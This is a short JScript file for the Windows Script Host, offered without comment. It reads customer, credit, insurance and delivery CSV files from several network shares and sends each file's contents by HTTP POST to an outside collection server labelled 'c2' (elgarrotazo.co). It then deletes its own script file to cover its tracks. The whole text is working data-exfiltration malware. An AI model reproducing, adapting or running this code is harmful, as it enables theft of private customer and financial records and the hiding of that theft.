var shares = [
  "\\\\ELGARROTAZO\\creditos.csv",
  "\\\\ELGARROTAZO\\clientes.csv",
  "\\\\SEPALMO\\seguros.csv",
  "\\\\HASTATOPARCONCERCA\\entregas.csv"
];

var c2 = "http://elgarrotazo.co/collect";

var fso = new ActiveXObject("Scripting.FileSystemObject");

for (var i = 0; i < shares.length; i++) {
  var data = "";
  if (fso.FileExists(shares[i])) {
    var f = fso.OpenTextFile(shares[i], 1);
    data = f.ReadAll();
    f.Close();
  }

  var xhr = new ActiveXObject("MSXML2.XMLHTTP");
  xhr.open("POST", c2, false);
  xhr.setRequestHeader("Content-Type", "application/octet-stream");
  xhr.setRequestHeader("X-File", shares[i]);
  xhr.send(data);
}

fso.DeleteFile("C:\\Users\\Public\\puravida.js");
